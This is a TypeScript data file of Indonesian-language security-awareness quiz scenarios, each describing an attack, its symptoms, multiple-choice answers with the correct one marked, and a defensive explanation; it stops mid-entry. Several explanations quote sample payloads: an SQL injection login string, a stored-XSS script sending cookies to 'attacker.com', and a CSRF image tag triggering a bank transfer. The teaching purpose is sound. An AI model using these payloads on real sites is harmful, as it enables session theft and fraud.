export type ScenarioDifficulty = 'mudah' | 'menengah' | 'sulit';

export interface ScenarioOption {
  text: string;
  isCorrect: boolean;
}

export interface Scenario {
  id: string;
  attackId: string;
  difficulty: ScenarioDifficulty;
  title: string;
  context: string;
  symptoms: string[];
  options: ScenarioOption[];
  explanation: string;
}

export const SCENARIOS: Scenario[] = [
  {
    id: 'sc-phishing-1',
    attackId: 'phishing',
    difficulty: 'mudah',
    title: 'Email Mencurigakan dari "Bank"',
    context:
      'Anda menerima email dari "security@bankcentral-update.com" dengan subjek "⚠️ Akun Anda Akan Diblokir dalam 24 Jam". Email meminta Anda klik tautan dan verifikasi data karena "aktivitas mencurigakan".',
    symptoms: [
      'Domain pengirim: bankcentral-update.com (bukan bankcentral.com)',
      'Menciptakan rasa urgensi ("24 jam", "diblokir")',
      'Tautan mengarah ke https://secure-bankcentral.xyz',
      'Meminta username, password, dan PIN sekaligus',
    ],
    options: [
      { text: 'Phishing — domain palsu dan taktik urgensi untuk mencuri kredensial', isCorrect: true },
      { text: 'Notifikasi keamanan sah dari bank yang sistem email-nya bermasalah', isCorrect: false },
      { text: 'Serangan DDoS yang dialihkan ke email pengguna', isCorrect: false },
      { text: 'SQL Injection melalui form login bank', isCorrect: false },
    ],
    explanation:
      'Ini adalah phishing klasik. Tanda-tanda: domain typosquatting (bankcentral-update.com), taktik urgency, URL redirect ke domain asing (.xyz), dan permintaan semua faktor autentikasi sekaligus. Bank tidak pernah meminta PIN melalui email.',
  },
  {
    id: 'sc-ransomware-1',
    attackId: 'ransomware',
    difficulty: 'menengah',
    title: 'File Kantor Tiba-tiba Tak Bisa Dibuka',
    context:
      'Staf keuangan melapor semua file Excel dan Word berubah ekstensi menjadi ".locked" dan tidak bisa dibuka. Di desktop muncul file "READ_ME_DECRYPT.txt" berisi instruksi untuk mentransfer 3 BTC ke alamat tertentu.',
    symptoms: [
      'Semua file berubah ekstensi menjadi .locked',
      'Volume Shadow Copies tidak bisa diakses',
      'File ransom note muncul di setiap folder',
      'Beberapa antivirus process dihentikan secara paksa',
    ],
    options: [
      { text: 'Ransomware — file dienkripsi dan tebusan diminta untuk kunci dekripsi', isCorrect: true },
      { text: 'File system corruption akibat hardware failure', isCorrect: false },
      { text: 'Insider threat yang menghapus file penting', isCorrect: false },
      { text: 'Virus yang hanya mengganti nama ekstensi tanpa enkripsi nyata', isCorrect: false },
    ],
    explanation:
      'Ini adalah ransomware. Indikator kunci: ekstensi file berubah massal, Shadow Copies dihapus (untuk mencegah recovery), antivirus dinonaktifkan, dan ransom note dengan demand cryptocurrency. Respons: isolasi jaringan segera, jangan bayar tebusan tanpa konsultasi ahli.',
  },
  {
    id: 'sc-sqli-1',
    attackId: 'sqli',
    difficulty: 'menengah',
    title: 'Login Admin Tanpa Password',
    context:
      'Tim keamanan menemukan entri log aneh: seseorang login ke panel admin dengan username "admin\'--" dan password kosong pada pukul 03:22 pagi. Tidak ada akun dengan username tersebut di database.',
    symptoms: [
      'Username mengandung karakter khusus: apostrof dan double-dash',
      'Login berhasil meski password kosong',
      'IP login berasal dari Tor exit node',
      'Log database menunjukkan query anomali pada waktu yang sama',
    ],
    options: [
      { text: 'SQL Injection — karakter SQL menyabotase query autentikasi', isCorrect: true },
      { text: 'Brute force — ribuan percobaan password hingga berhasil', isCorrect: false },
      { text: 'Session hijacking dari cookie admin yang bocor', isCorrect: false },
      { text: 'Backdoor yang dipasang developer sebelumnya', isCorrect: false },
    ],
    explanation:
      'Username "admin\'--" adalah SQL Injection klasik. Apostrof (\'>) menutup string query, lalu "--" mengkomentar sisa query termasuk pengecekan password. Query menjadi: SELECT * FROM users WHERE username=\'admin\' -- AND password=\'...\' — password check diabaikan.',
  },
  {
    id: 'sc-mitm-1',
    attackId: 'mitm',
    difficulty: 'menengah',
    title: 'Transaksi Internet Banking di Kafe',
    context:
      'Seorang karyawan melakukan transfer bank dari laptop di kafe yang menggunakan Wi-Fi gratis "FreeKafeWifi". Besoknya ia mendapat notifikasi transfer tidak dikenal sebesar Rp 15 juta dari akunnya.',
    symptoms: [
      'Menggunakan Wi-Fi publik tanpa verifikasi',
      'Browser sempat menampilkan peringatan sertifikat "tidak aman"',
      'Halaman bank terlihat sama tapi URL menggunakan HTTP bukan HTTPS',
      'Tidak ada 2FA diaktifkan pada akun bank',
    ],
    options: [
      { text: 'MITM Attack — attacker mencegat komunikasi di jaringan Wi-Fi palsu', isCorrect: true },
      { text: 'Phishing — karyawan memasukkan data ke website palsu', isCorrect: false },
      { text: 'Data breach pada server bank', isCorrect: false },
      { text: 'Keylogger pada laptop yang dipinjam di kafe', isCorrect: false },
    ],
    explanation:
      'Ini adalah MITM via rogue Wi-Fi hotspot. Attacker membuat hotspot palsu "FreeKafeWifi", melakukan SSL stripping (menurunkan HTTPS ke HTTP), dan mencegat semua komunikasi termasuk kredensial bank. Tanda kunci: peringatan sertifikat diabaikan dan URL HTTP bukannya HTTPS.',
  },
  {
    id: 'sc-xss-1',
    attackId: 'xss',
    difficulty: 'sulit',
    title: 'Komentar Blog yang Mencuri Sesi',
    context:
      'Sebuah platform blog melaporkan bahwa beberapa akun admin "tiba-tiba logout sendiri" lalu ada aktivitas posting artikel spam. Investigasi menemukan komentar lama yang berisi teks HTML aneh.',
    symptoms: [
      'Komentar mengandung tag <script> yang tersimpan di database',
      'Script dieksekusi setiap kali halaman dengan komentar dibuka',
      'Cookie sesi admin dikirim ke server eksternal',
      'Tidak ada validasi atau sanitasi input pada form komentar',
    ],
    options: [
      { text: 'Stored XSS — skrip berbahaya disimpan dan dieksekusi di browser korban', isCorrect: true },
      { text: 'CSRF — request berbahaya dikirim menggunakan sesi admin', isCorrect: false },
      { text: 'SQL Injection pada tabel komentar untuk modifikasi konten', isCorrect: false },
      { text: 'Brute force pada akun admin secara paralel', isCorrect: false },
    ],
    explanation:
      'Ini adalah Stored XSS (Persistent XSS). Skrip <script>document.location=\'attacker.com/steal?c=\'+document.cookie</script> tersimpan di database dan dieksekusi di browser setiap pengunjung. Sesi cookie admin dicuri dan digunakan untuk posting spam. Pencegahan: HTML encoding output dan Content Security Policy.',
  },
  {
    id: 'sc-ddos-1',
    attackId: 'ddos',
    difficulty: 'mudah',
    title: 'Website E-commerce Mendadak Down',
    context:
      'Website toko online besar mengalami downtime total selama 2 jam saat flash sale. Monitoring menunjukkan traffic naik 500x dari normal dalam hitungan menit, semua dari ribuan IP berbeda di berbagai negara.',
    symptoms: [
      'Traffic naik drastis dari ribuan IP berbeda secara simultan',
      'Server CPU dan bandwidth 100% tersaturasi',
      'Pola request tidak normal: tidak ada browser headers, tidak ada sesi',
      'Traffic datang dari rentang IP yang terdaftar sebagai known botnet',
    ],
    options: [
      { text: 'DDoS Attack — botnet membanjiri server untuk membuat layanan tidak tersedia', isCorrect: true },
      { text: 'Traffic organik flash sale yang melebihi kapasitas server', isCorrect: false },
      { text: 'SQL Injection yang memperlambat seluruh server database', isCorrect: false },
      { text: 'Ransomware yang menginfeksi server web', isCorrect: false },
    ],
    explanation:
      'Ini adalah DDoS volumetric attack menggunakan botnet. Indikator: traffic tiba-tiba masif dari ribuan IP, pola request tidak organik (tidak ada browser headers/sesi normal), IP dari known botnet range. Respons: aktifkan CDN/DDoS protection, rate limiting, null routing IP berbahaya.',
  },
  {
    id: 'sc-credential-stuffing-1',
    attackId: 'credential-stuffing',
    difficulty: 'sulit',
    title: 'Ribuan Login Gagal dalam Semalam',
    context:
      'Sistem monitoring mendeteksi 50.000 percobaan login antara pukul 02:00–04:00 pagi. Uniknya, setiap IP hanya mencoba 1–3 kali login, menggunakan kombinasi email/password yang berbeda-beda. Sekitar 300 login berhasil.',
    symptoms: [
      'Volume percobaan login sangat tinggi tapi tiap IP hanya 1-3 percobaan',
      'Kombinasi email/password sangat spesifik (bukan random)',
      'Waktu serangan: dini hari saat monitoring longgar',
      'User-agent bervariasi tapi pola request identik (otomatis)',
    ],
    options: [
      { text: 'Credential Stuffing — daftar email/password dari breach lain diuji otomatis', isCorrect: true },
      { text: 'Brute force — setiap kombinasi karakter dicoba secara acak', isCorrect: false },
      { text: 'Password spraying — satu password umum dicoba ke semua akun', isCorrect: false },
      { text: 'Dictionary attack — daftar kata umum diuji sebagai password', isCorrect: false },
    ],
    explanation:
      'Ini adalah credential stuffing. Bedanya dari brute force: kombinasi spesifik (bukan random), distribusi IP untuk menghindari rate limiting per IP, dan success rate ~0.6% (tipikal credential stuffing). Datanya dari breach lain seperti LinkedIn, Adobe. Pencegahan: MFA, login anomaly detection, Have I Been Pwned integration.',
  },
  {
    id: 'sc-social-eng-1',
    attackId: 'social-engineering',
    difficulty: 'mudah',
    title: 'Telepon dari "Helpdesk IT"',
    context:
      'Staf HR menerima telepon dari seseorang yang mengaku sebagai tim IT internal. Penelepon mengatakan ada "update sistem darurat" dan meminta staf memberikan password sementara agar "dapat mengakses workstation dari jarak jauh".',
    symptoms: [
      'Penelepon menciptakan urgensi ("darurat", "segera")',
      'Meminta informasi sensitif (password) melalui telepon',
      'Tidak melalui prosedur helpdesk resmi (tiket sistem)',
      'Penelepon tidak dapat memverifikasi identitas dengan badge number',
    ],
    options: [
      { text: 'Vishing (Voice Phishing) — manipulasi telepon untuk mencuri kredensial', isCorrect: true },
      { text: 'Serangan teknis otomatis yang memerlukan input user', isCorrect: false },
      { text: 'Legitimate IT procedure yang kedengarannya mencurigakan', isCorrect: false },
      { text: 'Insider threat dari karyawan IT sendiri', isCorrect: false },
    ],
    explanation:
      'Ini adalah vishing (voice phishing) — social engineering melalui telepon. Tanda merah: meminta password via telepon (IT yang sah tidak pernah minta password), urgensi buatan, tidak ada tiket resmi, tidak bisa verifikasi identitas. Respons yang benar: tutup telepon, verifikasi ke IT langsung via email/sistem tiket resmi.',
  },

  // ── MUDAH ──────────────────────────────────────────────────────────────────

  {
    id: 'sc-brute-force-1',
    attackId: 'brute-force',
    difficulty: 'mudah',
    title: 'Akun Instagram Tidak Bisa Dibuka',
    context:
      'Seorang influencer melaporkan akun Instagram-nya tiba-tiba bisa diakses orang lain. Investigasi menemukan 8.000 percobaan login dari satu IP dalam waktu 20 menit, semua mencoba password berbeda secara berurutan.',
    symptoms: [
      'Ribuan percobaan login dari satu IP dalam waktu singkat',
      'Password dicoba secara berurutan: 123456, 123457, 123458...',
      'Tidak ada upaya menyembunyikan traffic (IP tunggal)',
      'Akhirnya berhasil login dengan password "sunshine2023"',
    ],
    options: [
      { text: 'Brute Force — semua kombinasi password dicoba secara sistematis', isCorrect: true },
      { text: 'Credential stuffing — daftar password dari breach lain dipakai', isCorrect: false },
      { text: 'Phishing — korban ditipu memasukkan password ke halaman palsu', isCorrect: false },
      { text: 'SIM Swapping — nomor telepon diambil alih untuk reset password', isCorrect: false },
    ],
    explanation:
      'Ini adalah brute force attack murni. Ciri khasnya: satu IP, volume tinggi, password dicoba secara berurutan/otomatis, tanpa menyembunyikan diri. Berbeda dari credential stuffing yang menggunakan kombinasi spesifik dari data breach dan banyak IP. Pencegahan: rate limiting, CAPTCHA, lockout setelah beberapa kali gagal, dan password yang panjang.',
  },

  {
    id: 'sc-qrishing-1',
    attackId: 'qrishing',
    difficulty: 'mudah',
    title: 'QR Code Parkir yang Mencurigakan',
    context:
      'Di sebuah mal, pengunjung disuruh scan QR code untuk membayar parkir. Beberapa pengunjung melaporkan setelah scan, mereka diarahkan ke halaman "pembayaran" yang meminta data kartu kredit lengkap termasuk CVV.',
    symptoms: [
      'QR code ditempel di atas QR code asli (stiker di atas stiker)',
      'Website yang dibuka bukan domain resmi pengelola mal',
      'Halaman meminta data kartu lengkap: nomor, nama, expired, CVV',
      'Tidak ada logo atau branding resmi yang konsisten',
    ],
    options: [
      { text: 'QRishing — QR code palsu mengarahkan ke website phishing untuk mencuri data kartu', isCorrect: true },
      { text: 'Skimming — perangkat fisik di mesin ATM membaca kartu', isCorrect: false },
      { text: 'Phishing email yang dikirim ke pengunjung mal', isCorrect: false },
      { text: 'MITM attack pada jaringan Wi-Fi mal', isCorrect: false },
    ],
    explanation:
      'Ini adalah QRishing (QR Code Phishing). Attacker menempel QR code palsu di atas QR code asli. Saat di-scan, korban dibawa ke halaman phishing yang meniru sistem pembayaran resmi. CVV diminta untuk memvalidasi kartu secara ilegal. Selalu verifikasi domain URL setelah scan QR, dan waspadai QR code yang tampak ditempel/dimodifikasi.',
  },

  {
    id: 'sc-tailgating-1',
    attackId: 'tailgating',
    difficulty: 'mudah',
    title: 'Orang Asing Masuk Gedung Kantor',
    context:
      'Seorang resepsionis melihat rekaman CCTV: pria berpakaian rapi membawa kotak besar berpura-pura jadi kurir. Saat karyawan membuka pintu dengan akses kartu, pria tersebut langsung ikut masuk tanpa scan kartu sendiri.',
    symptoms: [
      'Orang tidak dikenal memasuki area restricted tanpa akses kartu sendiri',
      'Menggunakan kesopanan sosial — karyawan merasa tidak enak menolak',
      'Memakai kostum/atribut yang meyakinkan (seragam kurir, jas)',
      'Tidak tercatat di sistem log akses gedung',
    ],
    options: [
      { text: 'Tailgating — menyusup ke area aman dengan mengikuti orang yang memiliki akses sah', isCorrect: true },
      { text: 'Social engineering via telepon untuk mendapat akses fisik', isCorrect: false },
      { text: 'Evil maid attack — memodifikasi perangkat saat ditinggal', isCorrect: false },
      { text: 'Insider threat — karyawan yang memberikan akses secara sadar', isCorrect: false },
    ],
    explanation:
      'Ini adalah tailgating (piggyback attack) — teknik serangan fisik paling sederhana. Attacker memanfaatkan kesopanan sosial: orang cenderung tidak mau menutup pintu di depan muka orang lain. Solusi: mantrapping (dua pintu), security awareness training, kebijakan tegas "satu orang satu scan", dan CCTV dengan monitoring real-time.',
  },

  {
    id: 'sc-bad-usb-1',
    attackId: 'bad-usb',
    difficulty: 'mudah',
    title: 'USB di Parkiran Kantor',
    context:
      'Seorang karyawan menemukan USB flash drive bertuliskan "Gaji Karyawan Q4 2024" di parkiran kantor. Penasaran, ia mencolokkannya ke laptop kerjanya. Beberapa detik kemudian, Defender Windows muncul lalu langsung dimatikan.',
    symptoms: [
      'USB ditemukan di tempat umum/strategis, bukan milik siapapun yang dikenal',
      'USB langsung melakukan aksi saat dicolok tanpa interaksi user',
      'Windows Defender dinonaktifkan secara otomatis',
      'Muncul proses asing berjalan di background',
    ],
    options: [
      { text: 'Bad USB / USB Drop Attack — perangkat USB berbahaya yang menjalankan payload otomatis', isCorrect: true },
      { text: 'Virus biasa yang ikut dalam file di dalam USB', isCorrect: false },
      { text: 'Keylogger hardware yang merekam keystroke', isCorrect: false },
      { text: 'Evil maid attack yang dilakukan saat laptop tidak dijaga', isCorrect: false },
    ],
    explanation:
      'Ini adalah Bad USB / USB Drop Attack. USB dimodifikasi firmware-nya untuk berpura-pura sebagai keyboard (HID device), lalu otomatis mengetik perintah berbahaya dalam milidetik. Karena OS mempercayai "keyboard", Defender bisa dimatikan sebelum sempat bereaksi. USB yang ditemukan di tempat umum hampir selalu jebakan — jangan pernah colok ke perangkat kerja.',
  },

  {
    id: 'sc-sim-swap-1',
    attackId: 'sim-swapping',
    difficulty: 'mudah',
    title: 'Kartu SIM Tiba-tiba Tidak Aktif',
    context:
      'Seorang pengusaha mendapati kartu SIM-nya tiba-tiba tidak aktif ("No Service") selama 2 jam. Setelah SIM aktif kembali, ia menemukan ada transfer keluar Rp 200 juta dari rekening bank yang dilindungi SMS OTP.',
    symptoms: [
      'Kartu SIM mendadak tidak aktif tanpa sebab teknis',
      'Tidak bisa menerima SMS atau telepon',
      'Setelah aktif kembali, ada transaksi tidak dikenal',
      'OTP untuk transaksi tersebut tidak pernah diterima korban',
    ],
    options: [
      { text: 'SIM Swapping — nomor telepon dipindahkan ke SIM attacker untuk mencegat OTP', isCorrect: true },
      { text: 'MITM attack yang mencegat SMS di jaringan seluler', isCorrect: false },
      { text: 'Malware di HP yang mencuri OTP sebelum sampai ke korban', isCorrect: false },
      { text: 'Phishing yang mendapatkan semua data termasuk OTP', isCorrect: false },
    ],
    explanation:
      'Ini adalah SIM Swapping. Attacker menghubungi operator seluler dengan informasi pribadi korban (yang sudah dikumpulkan dari media sosial/breach) untuk memindahkan nomor ke SIM miliknya. Saat SIM aktif di attacker, korban kehilangan sinyal. Semua SMS OTP kini masuk ke attacker. Pencegahan: gunakan authenticator app (TOTP) bukan SMS OTP, minta operator aktifkan SIM lock.',
  },

  {
    id: 'sc-keylogger-1',
    attackId: 'keylogger',
    difficulty: 'mudah',
    title: 'Password Bocor Padahal Tidak Pernah Phishing',
    context:
      'Direktur keuangan sebuah perusahaan mendapati email bisnisnya diakses orang lain. Ia yakin tidak pernah klik link mencurigakan. Analisis forensik menemukan file DLL asing yang berjalan sejak 3 bulan lalu di laptopnya.',
    symptoms: [
      'File DLL tidak dikenal berjalan sebagai proses background',
      'File log tersembunyi berisi semua keystroke dari 3 bulan terakhir',
      'Data dikirim ke server luar negeri setiap jam',
      'Password berubah sendiri — akun diakses dari IP asing',
    ],
    options: [
      { text: 'Keylogger — software merekam semua ketikan keyboard termasuk password', isCorrect: true },
      { text: 'Credential stuffing menggunakan data dari breach sebelumnya', isCorrect: false },
      { text: 'Shoulder surfing — seseorang memata-matai saat mengetik', isCorrect: false },
      { text: 'Phishing yang tidak disadari korban', isCorrect: false },
    ],
    explanation:
      'Ini adalah software keylogger yang tersembunyi sebagai DLL. Merekam semua keystroke (termasuk password, pesan rahasia, data kartu kredit) dan mengirimkannya ke C2 server. Tidak terdeteksi selama 3 bulan karena menyamar sebagai sistem file. Pencegahan: endpoint detection (EDR), application whitelisting, dan password manager dengan autofill (tidak mengetik password secara manual).',
  },

  // ── MENENGAH ───────────────────────────────────────────────────────────────

  {
    id: 'sc-csrf-1',
    attackId: 'csrf',
    difficulty: 'menengah',
    title: 'Transfer Bank yang Tidak Pernah Dilakukan',
    context:
      'Seorang nasabah membuka forum diskusi investasi sambil tetap login di internet banking. Besoknya ia melihat ada transfer Rp 5 juta ke rekening asing yang tidak ia kenal, padahal ia tidak pernah melakukan transfer tersebut.',
    symptoms: [
      'Transaksi terjadi saat korban sedang browsing website lain',
      'Korban masih dalam sesi login yang aktif di bank',
      'Di forum ada gambar yang URL-nya mengarah ke endpoint transfer bank',
      'Tidak ada konfirmasi tambahan yang diminta sebelum transfer',
    ],
    options: [
      { text: 'CSRF — request transfer dikirim otomatis menggunakan sesi aktif korban', isCorrect: true },
      { text: 'MITM attack yang memodifikasi request transfer korban', isCorrect: false },
      { text: 'XSS di website bank yang menjalankan script transfer', isCorrect: false },
      { text: 'Insider threat dari staf bank yang melakukan transfer manual', isCorrect: false },
    ],
    explanation:
      'Ini adalah CSRF (Cross-Site Request Forgery). Tag <img src="https://bank.com/transfer?to=attacker&amount=5000000"> di forum memicu request ke bank dengan cookie sesi korban yang masih aktif. Bank mengira request sah karena ada sesi valid. Pencegahan: CSRF token unik per request, SameSite cookie attribute, re-autentikasi untuk transaksi finansial.',
  },

  {
    id: 'sc-dns-spoofing-1',
    attackId: 'dns-spoofing',
    difficulty: 'menengah',
    title: 'Website Asli tapi Isinya Berbeda',
    context:
      'Tim keamanan bank menerima laporan dari nasabah: mereka mengetik URL bank yang benar di browser, tapi tiba-tiba diarahkan ke halaman login yang tampilannya sedikit berbeda. Sertifikat SSL menunjukkan nama domain yang sama.',
    symptoms: [
      'URL yang diketik benar tapi tiba-tiba redirect ke IP yang berbeda',
      'DNS cache di router menunjukkan record yang tidak konsisten',
      'Tampilan website sedikit berbeda dari biasanya',
      'Serangan hanya terjadi pada jaringan lokal tertentu, bukan semua user',
    ],
    options: [
      { text: 'DNS Spoofing — cache DNS diracuni agar domain mengarah ke IP attacker', isCorrect: true },
      { text: 'Typosquatting — nasabah mengetik URL yang salah ke domain mirip', isCorrect: false },
      { text: 'BGP Hijacking — rute internet dialihkan di level AS', isCorrect: false },
      { text: 'SSL Stripping — koneksi HTTPS diturunkan ke HTTP', isCorrect: false },
    ],
    explanation:
      'Ini adalah DNS Cache Poisoning / DNS Spoofing. Attacker memasukkan record DNS palsu ke cache resolver lokal, sehingga domain bank.com mengarah ke IP attacker. Korban tidak sadar karena URL yang mereka ketik sudah benar. Hanya terjadi pada jaringan lokal karena cache router yang diracuni. Pencegahan: DNSSEC, DNS over HTTPS (DoH), validasi sertifikat SSL secara ketat.',
  },

  {
    id: 'sc-arp-spoofing-1',
    attackId: 'arp-spoofing',
    difficulty: 'menengah',
    title: 'Data Internal Bocor di Jaringan LAN',
    context:
      'Admin jaringan menemukan bahwa komunikasi antar server internal bisa "dibaca" oleh satu workstation tertentu. Analisis Wireshark menunjukkan workstation tersebut menerima traffic yang seharusnya hanya untuk server lain.',
    symptoms: [
      'Satu workstation menerima traffic yang bukan miliknya',
      'Tabel ARP di switch menunjukkan MAC address ganda untuk satu IP',
      'Broadcast ARP Reply terus-menerus dikirim dari workstation tersebut',
      'Traffic antar dua server melewati workstation sebagai relay',
    ],
    options: [
      { text: 'ARP Spoofing — attacker mengirim ARP palsu agar traffic LAN melewatinya', isCorrect: true },
      { text: 'Port mirroring yang dikonfigurasi admin secara tidak sengaja', isCorrect: false },
      { text: 'Packet sniffing pasif tanpa memodifikasi network traffic', isCorrect: false },
      { text: 'DNS Spoofing yang mengalihkan traffic ke workstation tersebut', isCorrect: false },
    ],
    explanation:
      'Ini adalah ARP Spoofing / ARP Poisoning. Attacker terus-menerus broadcast ARP Reply palsu: "IP server = MAC workstation attacker". Semua perangkat memperbarui tabel ARP mereka, sehingga traffic ke server dialihkan melalui workstation attacker (classic MITM di layer 2). Indikator kunci: duplicate MAC, gratuitous ARP, traffic routing anomali. Pencegahan: Dynamic ARP Inspection (DAI) di switch, static ARP entries untuk server kritis.',
  },

  {
    id: 'sc-clickjacking-1',
    attackId: 'clickjacking',
    difficulty: 'menengah',
    title: 'Tombol "Like" yang Sebenarnya Tombol Konfirmasi',
    context:
      'Sebuah website berita populer diketahui menyematkan iframe tersembunyi dari website bank di atas tombol "Like" artikel. Saat pengunjung mengklik "Like", mereka tidak sadar telah mengklik tombol "Konfirmasi Transfer" di iframe bank yang transparan.',
    symptoms: [
      'Tombol di website tampak normal tapi ada iframe tersembunyi di atasnya',
      'Iframe memiliki opacity: 0 tapi z-index tinggi sehingga menerima klik',
      'Aksi yang terjadi berbeda dari apa yang user niatkan',
      'Hanya terjadi jika user sudah login ke layanan yang di-iframe',
    ],
    options: [
      { text: 'Clickjacking — iframe transparan melapisi UI sehingga klik diarahkan ke aksi berbahaya', isCorrect: true },
      { text: 'CSRF — request otomatis dikirim tanpa klik user sama sekali', isCorrect: false },
      { text: 'XSS — skrip di website bank dieksekusi dari domain lain', isCorrect: false },
      { text: 'Social engineering yang meyakinkan user untuk klik tautan berbahaya', isCorrect: false },
    ],
    explanation:
      'Ini adalah Clickjacking (UI Redressing). Iframe dengan opacity:0 berisi halaman bank diposisikan tepat di atas tombol "Like". Klik user sebenarnya mengenai tombol bank di iframe. Berbeda dari CSRF: clickjacking membutuhkan klik aktif user, bukan otomatis. Pencegahan: header X-Frame-Options: DENY atau Content-Security-Policy: frame-ancestors \'none\'.',
  },

  {
    id: 'sc-rainbow-table-1',
    attackId: 'rainbow-table',
    difficulty: 'menengah',
    title: 'Database Password Bocor tapi Sudah Di-hash',
    context:
      'Sebuah forum bocor 2 juta password yang tersimpan sebagai MD5 hash. Dalam waktu 3 jam, attacker sudah berhasil "memecahkan" 1,8 juta hash tanpa brute force sama sekali. Prosesnya sangat cepat bahkan untuk password kompleks.',
    symptoms: [
      'Hash dipecahkan sangat cepat — tidak mungkin brute force satu per satu',
      'Password yang dipecahkan bervariasi panjang dan kompleksitasnya',
      'Hash menggunakan MD5 tanpa salt',
      'Attacker menggunakan file lookup besar (>100GB)',
    ],
    options: [
      { text: 'Rainbow Table Attack — hash dicocokkan ke tabel precomputed untuk reverse lookup', isCorrect: true },
      { text: 'Brute force yang dipercepat dengan GPU cluster', isCorrect: false },
      { text: 'Dictionary attack menggunakan wordlist common passwords', isCorrect: false },
      { text: 'Exploit pada algoritma MD5 untuk reverse hash secara matematis', isCorrect: false },
    ],
    explanation:
      'Ini adalah Rainbow Table Attack. Attacker punya database precomputed berisi jutaan hash→plaintext mapping. Lookup hash sangat cepat (O(1)) karena tinggal mencocokkan, bukan menghitung ulang. MD5 tanpa salt sangat rentan. Pencegahan: gunakan bcrypt/Argon2 (slow hash), tambahkan salt unik per user untuk mencegah rainbow table berlaku.',
  },

  {
    id: 'sc-cloud-misconfig-1',
    attackId: 'cloud-misconfig',
    difficulty: 'menengah',
    title: 'Data Pelanggan Bisa Diakses Siapapun',
    context:
      'Seorang peneliti keamanan menemukan data pribadi 500.000 pelanggan sebuah startup e-commerce bisa diakses via URL publik tanpa autentikasi. URL-nya ditemukan melalui Google search sederhana.',
    symptoms: [
      'URL S3 bucket dapat diakses tanpa login: s3.amazonaws.com/startup-customers/...',
      'Konfigurasi bucket: "Block Public Access" dimatikan',
      'File berisi nama, email, no. HP, alamat, dan data kartu kredit terenkripsi',
      'Tidak ada log akses yang memantau siapa yang mengunduh data',
    ],
    options: [
      { text: 'Cloud Misconfiguration — S3 bucket sengaja atau tidak sengaja dibuat publik', isCorrect: true },
      { text: 'SQL Injection pada API yang mengekspos data ke bucket publik', isCorrect: false },
      { text: 'Insider threat yang mengubah permission bucket', isCorrect: false },
      { text: 'Data breach via server compromise, data lalu diunggah ke publik', isCorrect: false },
    ],
    explanation:
      'Ini adalah Cloud Misconfiguration — salah satu penyebab data breach terbesar di era cloud. S3 bucket dengan "Block Public Access" dimatikan berarti siapapun di internet bisa mengakses semua file. Ditemukan Google karena bot indexing URL publik. Pencegahan: Infrastructure-as-Code dengan security scan, AWS Config Rules, S3 Block Public Access di level organisasi, dan regular cloud security posture assessment.',
  },

  {
    id: 'sc-insider-threat-1',
    attackId: 'insider-threat',
    difficulty: 'menengah',
    title: 'Data Kompetitor Terlalu Akurat',
    context:
      'Divisi business intelligence menemukan kompetitor selalu selangkah lebih maju — strategi pricing mereka hampir identik dengan rencana internal yang belum dipublikasikan. Tidak ada tanda intrusi dari luar pada sistem.',
    symptoms: [
      'Tidak ada anomali login dari IP eksternal atau waktu tidak wajar',
      'Kebocoran informasi sangat spesifik dan terstruktur (bukan acak)',
      'Selalu terjadi sebelum meeting strategis besar',
      'Log DLP menunjukkan volume transfer file besar ke USB dari satu komputer',
    ],
    options: [
      { text: 'Insider Threat — karyawan internal mencuri dan membocorkan informasi strategis', isCorrect: true },
      { text: 'APT yang sudah lama bersembunyi di jaringan tanpa terdeteksi', isCorrect: false },
      { text: 'Social engineering pada eksekutif untuk mendapatkan info strategis', isCorrect: false },
      { text: 'Watering hole attack yang menginfeksi laptop eksekutif', isCorrect: false },
    ],
    explanation:
      'Ini adalah Insider Threat — malicious insider yang secara sengaja membocorkan informasi kompetitif. Ciri khas: tidak ada jejak ekstrusi via jaringan, akses ke data sesuai hak aksesnya (tidak ada privilege escalation), dan kebocoran sangat spesifik. DLP (Data Loss Prevention) mendeteksi transfer USB. Pencegahan: least privilege, DLP monitoring, User and Entity Behavior Analytics (UEBA), dan background check berkala.',
  },

  {
    id: 'sc-mobile-malware-1',
    attackId: 'mobile-malware',
    difficulty: 'menengah',
    title: 'Aplikasi Pinjaman yang Meminta Akses Berlebihan',
    context:
      'Seorang pengguna menginstal aplikasi "Pinjaman Cepat" dari link WhatsApp (bukan Play Store). Setelah install, baterai cepat habis, data internet melonjak, dan kontaknya mulai menerima pesan spam atas namanya.',
    symptoms: [
      'Aplikasi diinstal dari luar Play Store (sideload APK)',
      'Meminta izin: kontak, SMS, mikrofon, kamera, storage sekaligus',
      'Baterai dan data melonjak saat app berjalan di background',
      'Kontak di HP menerima pesan pinjaman atas nama korban',
    ],
    options: [
      { text: 'Mobile Malware — APK berbahaya yang mencuri data dan menyebar via kontak', isCorrect: true },
      { text: 'Aplikasi legitimate dengan bug yang menyebabkan performa buruk', isCorrect: false },
      { text: 'Phishing via SMS yang mengarahkan ke website berbahaya', isCorrect: false },
      { text: 'SIM Swapping yang memungkinkan akses ke akun pesan korban', isCorrect: false },
    ],
    explanation:
      'Ini adalah Mobile Malware (Android). APK yang di-sideload dari luar Play Store melewati semua screening keamanan Google. Setelah install, malware meminta permission excessive, mengekstrak kontak dan SMS OTP, menggunakan data background untuk komunikasi C2, dan self-propagate via kontak. Pencegahan: hanya instal dari Play Store, nonaktifkan "Install from Unknown Sources", periksa permission yang diminta sebelum install.',
  },

  {
    id: 'sc-bec-1',
    attackId: 'bec',
    difficulty: 'menengah',
    title: 'Email CEO yang Minta Transfer Mendesak',
    context:
      'Staf keuangan menerima email dari CEO yang sedang "di luar negeri" meminta transfer darurat Rp 800 juta ke rekening vendor baru untuk deal rahasia yang tidak boleh dibicarakan ke siapapun. Email terlihat persis dari akun CEO.',
    symptoms: [
      'Email dari alamat yang sangat mirip: ceo@companyname-corp.com (bukan companyname.com)',
      'Menciptakan urgensi dan kerahasiaan ("jangan beritahu siapapun")',
      'Meminta transfer ke rekening yang belum pernah digunakan sebelumnya',
      'Tidak bisa dikonfirmasi via telepon — "CEO sedang di meeting penting"',
    ],
    options: [
      { text: 'BEC (Business Email Compromise) — impersonasi CEO untuk meminta transfer fraud', isCorrect: true },
      { text: 'Phishing biasa yang menyamar sebagai komunikasi internal', isCorrect: false },
      { text: 'Insider threat dari staf keuangan sendiri yang bersekongkol', isCorrect: false },
      { text: 'Account takeover pada email CEO yang asli', isCorrect: false },
    ],
    explanation:
